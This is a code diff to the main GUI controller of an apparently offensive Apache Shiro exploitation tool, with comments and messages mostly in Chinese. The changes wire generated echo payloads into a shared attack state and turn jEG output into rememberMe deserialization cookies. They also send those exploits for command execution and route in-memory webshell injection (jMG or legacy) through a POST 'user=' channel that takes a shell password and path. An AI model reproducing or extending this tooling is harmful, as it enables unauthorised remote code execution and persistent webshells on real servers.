@@ -263,12 +263,18 @@ public class MainController {
 
     /** 最近一次成功生成的回显载荷（jEG Base64 或 Legacy rememberMe=…） */
     private String lastEchoExploitPayload;
+    /** 最近一次成功生成的来源：Legacy / jEG 等 */
+    private String lastEchoExploitSource;
+    /** jEG 返回的建议请求头名（如 Cookie、User-Agent），用于将纯密文规范为 rememberMe Cookie */
+    private String lastEchoExploitRequestHeaderName;
     /** 最近一次成功生成的回显载荷所对应的 gadget */
     private String lastEchoExploitGadget;
     /** 最近一次成功生成的回显载荷所对应的 echo */
     private String lastEchoExploitEcho;
     /** 最近一次成功生成的内存马字节码串（Base64 等） */
     private String lastMemshellExploitPayload;
+    /** 最近一次内存马生成来源：Legacy / jMG（Shiro 注入时与主界面注入共用 POST 流程） */
+    private String lastMemshellExploitSource;
 
     public MainController() {
     }
@@ -388,8 +394,8 @@ public class MainController {
         }
         if (this.memshellShiroChainHintLabel != null) {
             this.memshellShiroChainHintLabel.setText(zh
-                    ? "「Shiro 注入」使用主界面「利用链」与密钥；表格中 Gadget 为 jMG 内部选项，与 Shiro 链无关。"
-                    : "Shiro inject uses the main Gadget chain and key; the grid Gadget is for jMG only.");
+                    ? "「Shiro 注入」与「内存马注入」相同：InjectMemTool 的 rememberMe + POST user=Base64（jMG/传统一致）。表格 Gadget 为 jMG 内部选项，与 Shiro 链无关。"
+                    : "Shiro inject matches Memshell tab: InjectMe rememberMe cookie + POST user=Base64 (jMG/Legacy). Grid Gadget is jMG-only, not the Shiro chain.");
         }
         if (this.sendMemshellShiroInjectBtn != null) {
             this.sendMemshellShiroInjectBtn.setText(zh ? "Shiro 注入" : "Shiro Inject");
@@ -1165,7 +1171,7 @@ public class MainController {
             return;
         }
         if (AttackService.gadget == null || AttackService.attackRememberMe == null || AttackService.attackRememberMe.trim().isEmpty()) {
-            this.execOutputArea.appendText(Utils.log("请先完成利用链检测，再执行命令"));
+            this.execOutputArea.appendText(Utils.log("请先完成利用链检测，或在「回显生成」中成功生成 rememberMe 载荷并同步后再执行命令"));
             return;
         }
         try {
@@ -1436,6 +1442,20 @@ public class MainController {
         return source;
     }
 
+    /**
+     * 将「回显生成」或「Shiro 利用」得到的载荷与构造链写入 {@link AttackService} 静态上下文。
+     * jEG 可能只输出密文，经 {@link AttackService#resolveRememberMeCookieLine} 规范为 {@code rememberMe=} 后与 Legacy 共用命令执行路径。
+     */
+    private void syncAttackServiceForEchoExploit(String rememberMeOrRawPayload, String jegHeaderNameHint, String gadgetName) {
+        String line = AttackService.resolveRememberMeCookieLine(rememberMeOrRawPayload, jegHeaderNameHint);
+        if (line != null) {
+            AttackService.attackRememberMe = line;
+        }
+        if (gadgetName != null && !gadgetName.trim().isEmpty()) {
+            AttackService.gadget = gadgetName.trim();
+        }
+    }
+
     private String buildEchoFailureGuidance(EchoGenerateResult result) {
         String src = result != null && result.getSource() != null ? result.getSource() : "";
         String msg = result != null && result.getMessage() != null ? result.getMessage() : "(无详情)";
@@ -1552,10 +1572,16 @@ public class MainController {
         this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
         if (result.isSuccess() && result.getPayload() != null && !result.getPayload().trim().isEmpty()) {
             this.lastEchoExploitPayload = result.getPayload().trim();
+            this.lastEchoExploitSource = result.getSource();
+            this.lastEchoExploitRequestHeaderName = result.getRequestHeaderName();
             this.lastEchoExploitGadget = this.gadgetOpt != null ? this.gadgetOpt.getValue() : null;
             this.lastEchoExploitEcho = this.echoOpt != null ? this.echoOpt.getValue() : null;
+            this.syncAttackServiceForEchoExploit(this.lastEchoExploitPayload, this.lastEchoExploitRequestHeaderName, this.lastEchoExploitGadget);
             this.echoGeneratorOutput.appendText("[缓存] 已记录回显载荷上下文，gadget=" + String.valueOf(this.lastEchoExploitGadget)
                     + ", echo=" + String.valueOf(this.lastEchoExploitEcho) + "\n");
+            if (AttackService.attackRememberMe != null && AttackService.looksLikeRememberMeCookiePayload(AttackService.attackRememberMe)) {
+                this.echoGeneratorOutput.appendText("[缓存] 已同步到命令执行/功能区（rememberMe Cookie，含 jEG 纯密文自动补前缀）\n");
+            }
         }
         if (!result.isSuccess()) {
             this.showGuidanceAlert(
@@ -1601,8 +1627,11 @@ public class MainController {
                     "请在「指定Key」填写 Base64 key，或先爆破密钥成功。");
             return;
         }
-        AppLogger.info("回显 Shiro 利用: gadget=" + AttackService.gadget + ", payloadKind="
-                + (AttackService.looksLikeRememberMeCookiePayload(this.lastEchoExploitPayload) ? "cookie" : "body"));
+        String coerced = AttackService.coerceRememberMeCookieHeader(this.lastEchoExploitPayload, this.lastEchoExploitRequestHeaderName);
+        boolean fromJeg = this.lastEchoExploitSource != null && "jEG".equalsIgnoreCase(this.lastEchoExploitSource.trim());
+        String payloadKind = fromJeg && coerced != null ? "jEG-as-rememberMe-cookie"
+                : (AttackService.looksLikeRememberMeCookiePayload(this.lastEchoExploitPayload) ? "cookie" : "body");
+        AppLogger.info("回显 Shiro 利用: gadget=" + AttackService.gadget + ", payloadKind=" + payloadKind);
         this.echoGeneratorOutput.appendText("[发送] 开始使用 Shiro 链发送回显载荷\n");
         this.echoGeneratorOutput.appendText("[发送] 当前检测到的构造链=" + String.valueOf(AttackService.gadget)
                 + ", 当前缓存载荷链=" + String.valueOf(this.lastEchoExploitGadget)
@@ -1611,7 +1640,18 @@ public class MainController {
                 && !AttackService.gadget.equals(this.lastEchoExploitGadget)) {
             this.echoGeneratorOutput.appendText("[警告] 当前检测链与缓存载荷链不一致；发送时将优先使用当前检测链。\n");
         }
-        if (AttackService.looksLikeRememberMeCookiePayload(this.lastEchoExploitPayload)) {
+        if (fromJeg && coerced != null) {
+            this.echoGeneratorOutput.appendText("[发送] jEG：与内置回显相同方式发送（GET，Cookie=rememberMe；命令执行仍通过 Authorization）\n");
+            this.lastEchoExploitPayload = coerced;
+            this.syncAttackServiceForEchoExploit(coerced, null, AttackService.gadget);
+            String result = this.attackService.sendRememberMeCookieExploit(coerced, this.echoGeneratorOutput);
+            if (result != null) {
+                this.echoGeneratorOutput.appendText("[发送结果] HTTP 已返回，长度=" + result.length() + "\n");
+                this.echoGeneratorOutput.appendText("[发送结果] " + this.attackService.classifyHttpResponse(result) + "\n");
+            } else {
+                this.echoGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
+            }
+        } else if (AttackService.looksLikeRememberMeCookiePayload(this.lastEchoExploitPayload)) {
             String selectedEcho = this.echoOpt != null ? this.echoOpt.getValue() : null;
             String rememberMe = this.attackService.GadgetPayload(AttackService.gadget, selectedEcho, key.trim());
             if (rememberMe == null || rememberMe.trim().isEmpty()) {
@@ -1622,6 +1662,7 @@ public class MainController {
             this.lastEchoExploitPayload = rememberMe.trim();
             this.lastEchoExploitGadget = AttackService.gadget;
             this.lastEchoExploitEcho = selectedEcho;
+            this.syncAttackServiceForEchoExploit(this.lastEchoExploitPayload, null, AttackService.gadget);
             this.echoGeneratorOutput.appendText("[发送] 已按当前构造链重新生成 rememberMe，gadget=" + AttackService.gadget
                     + ", echo=" + String.valueOf(selectedEcho) + "\n");
             String result = this.attackService.sendRememberMeCookieExploit(this.lastEchoExploitPayload, this.echoGeneratorOutput);
@@ -1632,7 +1673,8 @@ public class MainController {
                 this.echoGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
             }
         } else {
-            this.echoGeneratorOutput.appendText("[发送] 当前缓存回显上下文，gadget=" + String.valueOf(this.lastEchoExploitGadget)
+            this.echoGeneratorOutput.appendText("[发送] 当前缓存非 rememberMe Cookie 载荷，按内存马注入通道发送（POST user=…）\n");
+            this.echoGeneratorOutput.appendText("[发送] gadget=" + String.valueOf(this.lastEchoExploitGadget)
                     + ", echo=" + String.valueOf(this.lastEchoExploitEcho) + "\n");
             String result = this.attackService.sendInjectMemToolExploit(AttackService.gadget, key.trim(), this.lastEchoExploitPayload, this.echoGeneratorOutput);
             if (result != null) {
@@ -1727,6 +1769,7 @@ public class MainController {
         }
         if (result.getPayload() != null && !result.getPayload().trim().isEmpty()) {
             this.lastMemshellExploitPayload = result.getPayload().trim();
+            this.lastMemshellExploitSource = result.getSource();
         }
     }
 
@@ -1765,33 +1808,29 @@ public class MainController {
                     "请在「指定Key」填写 Base64 key，或先爆破密钥成功。");
             return;
         }
-        this.memshellGeneratorOutput.appendText("[发送] 开始使用 Shiro 链发送内存马载荷\n");
-        if (AttackService.looksLikeRememberMeCookiePayload(this.lastMemshellExploitPayload)) {
-            AppLogger.info("内存马 Shiro: rememberMe Cookie 直发");
-            String result = this.attackService.sendRememberMeCookieExploit(this.lastMemshellExploitPayload, this.memshellGeneratorOutput);
-            if (result != null) {
-                this.memshellGeneratorOutput.appendText("[发送结果] 已收到响应，长度=" + result.length() + "\n");
-            } else {
-                this.memshellGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
-            }
-            this.memshellGeneratorOutput.appendText("-------------------------------------------------\n");
-            return;
-        }
+        this.memshellGeneratorOutput.appendText("[发送] 与「内存马注入」相同流程：InjectMemTool rememberMe Cookie + POST user=生成载荷 Base64\n");
         String pass = this.shellPassText != null ? this.shellPassText.getText() : "";
         String path = this.shellPathText != null ? this.shellPathText.getText() : "";
-        AppLogger.info("内存马 Shiro 注入: gadget=" + AttackService.gadget + ", path=" + path);
+        String memLabel;
+        if (this.lastMemshellExploitSource != null && "jMG".equalsIgnoreCase(this.lastMemshellExploitSource.trim())) {
+            memLabel = "jMG " + String.valueOf(this.jmgToolOpt != null ? this.jmgToolOpt.getValue() : "")
+                    + "/" + String.valueOf(this.jmgShellOpt != null ? this.jmgShellOpt.getValue() : "");
+        } else {
+            memLabel = this.memShellOpt != null ? this.memShellOpt.getValue() : "传统模式内存马";
+        }
+        AppLogger.info("内存马 Shiro 注入: gadget=" + AttackService.gadget + ", path=" + path + ", label=" + memLabel);
         String result = this.attackService.sendInjectMemToolExploit(
                 AttackService.gadget,
                 key.trim(),
                 this.lastMemshellExploitPayload,
                 pass != null ? pass : "",
                 path != null ? path : "",
-                this.memshellGeneratorOutput);
+                this.memshellGeneratorOutput,
+                memLabel);
         if (result != null) {
             this.memshellGeneratorOutput.appendText("[发送结果] 已收到响应，长度=" + result.length() + "\n");
         } else {
             this.memshellGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
         }
-        this.memshellGeneratorOutput.appendText("-------------------------------------------------\n");
     }
 }
